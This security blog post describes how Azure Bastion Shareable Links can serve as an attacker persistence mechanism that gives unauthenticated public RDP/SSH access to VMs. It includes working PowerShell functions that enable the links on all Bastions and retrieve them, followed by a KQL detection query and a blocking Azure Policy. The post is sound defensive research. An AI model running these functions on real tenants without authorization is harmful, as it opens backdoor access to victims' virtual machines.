---
layout: post
title:  "Yet Another Azure VM Persistence Using Bastion Shareable Links"
date:   2022-11-26
---

Earlier this week Microsoft [announced the public preview of Shareable Links in Azure Bastion](https://learn.microsoft.com/en-us/azure/bastion/shareable-link). 

Out-of-the-box persistence for a Virtual Machine that is reachable through an Azure Bastion, allowing for yet [another](https://microsoft.github.io/Azure-Threat-Research-Matrix/Persistence/Persistence/) persistence mechanism in Azure?

I deployed an Azure Bastion to validate, enabled the feature, and generated a Shareable Link for a VM. The link has no additional authentication and is publicly accessible.

This may enable an adversary to abuse the feature to gain access to Remote Desktop or SSH, without requiring network access OR authentication.

**Example link:** Public link for Bastion - [https://bst-c6bf3220-015d-4d6e-8c19-32ac484e341f.bastion.azure.com/api/shareable-url/074fa24e-8614-47ea-94f7-f9f901003598](https://bst-c6bf3220-015d-4d6e-8c19-32ac484e341f.bastion.azure.com/api/shareable-url/074fa24e-8614-47ea-94f7-f9f901003598) 

![bastion](https://user-images.githubusercontent.com/26272119/204090894-4c9f4232-215a-472e-90d9-77dab0aba820.png)

To enable the feature and get a shareable link, the permissions listed below are required to perform this. These permissions are all associated with the Contributor role: 

- Microsoft.Network/bastionHosts/write
- Microsoft.Network/bastionHosts/createShareableLinks/action
- Microsoft.Network/bastionHosts/getShareableLinks/action

There are three operations required to configure the persistence:

1. Update the Bastion to enable the Shareable Link feature [https://learn.microsoft.com/en-us/rest/api/virtualnetwork/bastion-hosts/create-or-update?tabs=HTTP](https://learn.microsoft.com/en-us/rest/api/virtualnetwork/bastion-hosts/create-or-update?tabs=HTTP) 
2. Create a Shareable Link for a specified VM [https://learn.microsoft.com/en-us/rest/api/virtualnetwork/put-bastion-shareable-link/put-bastion-shareable-link?tabs=HTTP](https://learn.microsoft.com/en-us/rest/api/virtualnetwork/put-bastion-shareable-link/put-bastion-shareable-link?tabs=HTTP)
3. Retrieve the URL for the Shareable Link  [https://learn.microsoft.com/en-us/rest/api/virtualnetwork/get-bastion-shareable-link/get-bastion-shareable-link?tabs=HTTP](https://learn.microsoft.com/en-us/rest/api/virtualnetwork/get-bastion-shareable-link/get-bastion-shareable-link?tabs=HTTP) 

To streamline enablement of the feature, I wrote two functions, that I plan to further improve and submit to [Microburst](https://github.com/NetSPI/MicroBurst). 

This requires the Az module to be installed for it to retrieve a token:

```powershell
function Invoke-AzRestBastionShareableLink {

    # Author: Karim El-Melhaoui(@KarimsCloud), O3 Cyber
    # Description: PowerShell function for creating a shareable link in Azure Bastion
    # A VM must be specified as the link is attached to a VM.
    # https://learn.microsoft.com/en-us/azure/bastion/shareable-link

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true,
    HelpMessage="Name of VM to enable Shareable Link")]
    [string]$VMName = ""
    )

    $Token = Get-AzAccessToken
    $Headers = @{Authorization = "Bearer $($Token.Token)" }

    $AzBastions = Get-AzBastion
    Write-Output "Enabling Shareable Link feature on all Azure bastions"

    #Gets the ID of VM specified through name parameter to use for creating a shareable link
    $VMId = Get-AzVM -Name $VMName | Select-Object -ExpandProperty Id
    Write-Output "Id of VM: $VMId" 

    foreach ($AzBastion in $AzBastions) {

        
        $body = -join ('{"location": "',$AzBastion.location,'", "properties": {"enableShareableLink": "true","ipConfigurations": [{"name": "',$AzBastion.IpConfigurations.Name,'","properties":{"publicIPAddress": {"Id": "',$AzBastion.IpConfigurations.PublicIpAddress.Id,'"},"subnet":{"Id": "',$AzBastion.IpConfigurations.Subnet.Id,'"}}}]}}')
        $RGName = $AzBastion.ResourceGroupName
        $BastionName = $AzBastion.Name
        try {
            Write-Output "Enabling shareable links on $BastionName"
            Invoke-RestMethod -Method Put -Uri "https://management.azure.com/subscriptions/$($subscriptionId)/resourceGroups/$($RGName)/providers/Microsoft.Network/bastionHosts/$($BastionName)?api-version=2022-05-01" -Headers $Headers -Body $body -ContentType "application/json"

        }
        catch {
            Write-Output "Something went wrong. : $_"
        }
        
        #Generate body with VM ID specifie. 
        $VMBody = -join ('{"vms":[{"vm":{"id":"',$VMId,'"}}]}')

        try {
        #Creates shareable link for specified VM
        Invoke-RestMethod -Method Post -Uri "https://management.azure.com/subscriptions/$($subscriptionId)/resourceGroups/$($RGName)/providers/Microsoft.Network/bastionHosts/$($BastionName)/createShareableLinks?api-version=2022-05-01" -Headers $Headers -Body $VMBody -ContentType "application/json"

        }
        catch {
            Write-Output "Something went wrong. : $_"
        }
    }
}

Invoke-AzRestBastionShareableLink
```


Once the feature is enabled on a Bastion, you can retrieve the links using the function below. The retrieval of the Shareable Link is separated into a separate function as the Shareable Link cannot be retrieved until the operation for enabling it is complete.



```powershell
function Get-AzRestBastionShareableLink {

    # Author: Karim El-Melhaoui(@KarimsCloud), O3 Cyber
    # Description: PowerShell function for getting an existing shareable link in Azure Bastion
    # https://learn.microsoft.com/en-us/azure/bastion/shareable-link

    $Token = Get-AzAccessToken
    $Headers = @{Authorization = "Bearer $($Token.Token)" }

    $AzBastions = Get-AzBastion
    Write-Output "Getting all Shareable Links for Azure bastions"
    foreach ($AzBastion in $AzBastions) {        
        $RGName = $AzBastion.ResourceGroupName
        $BastionName = $AzBastion.Name
    
        try {
            $BastionLink = Invoke-RestMethod -Method Post -Uri "https://management.azure.com/subscriptions/$($subscriptionId)/resourceGroups/$($RGName)/providers/Microsoft.Network/bastionHosts/$($BastionName)/GetShareableLinks?api-version=2022-05-01" -Headers $Headers | Select-Object -ExpandProperty Value | Select-Object -ExpandProperty bsl
            Write-Host -ForegroundColor Green "Public link for Bastion: $BastionLink"
        }
        catch {
            Write-Output "Something went wrong. : $_"
        }
    }
}

Get-AzRestBastionShareableLink
```



# Detection

The particular operations can be deteted in the AzureActivity log with the KQL query below:

```bash
AzureActivity
| where OperationNameValue =~ "MICROSOFT.NETWORK/BASTIONHOSTS/GETSHAREABLELINKS/ACTION" or OperationNameValue =~ "MICROSOFT.NETWORK/BASTIONHOSTS/CREATESHAREABLELINKS/ACTION"
| order by TimeGenerated desc
| project Caller, CallerIpAddress, OperationName, TimeGenerated, ResourceId
```



# Prevention

Ideally, you should also consider preventing the feature using Azure Policy with the below Policy Definition:

```json
{
  "mode": "All",
  "parameters": {
    "effect": {
      "type": "String",
      "allowedValues": ["Audit", "Disabled", "Deny"]
    }
  },
  "policyRule": {
    "if": {
      "allOf": [
        {
          "field": "type",
          "equals": "Microsoft.Network/BastionHosts"
        },
        {
          "field": "Microsoft.Network/BastionHosts/enableShareableLink",
          "equals": true
        }
      ]
    },
    "then": {
      "effect": "[parameters('effect')]"
    }
  }
}
```


# Summary

Even though this is an intended feature and behavior, security teams should be aware of the feature and consider detection/prevention methods.
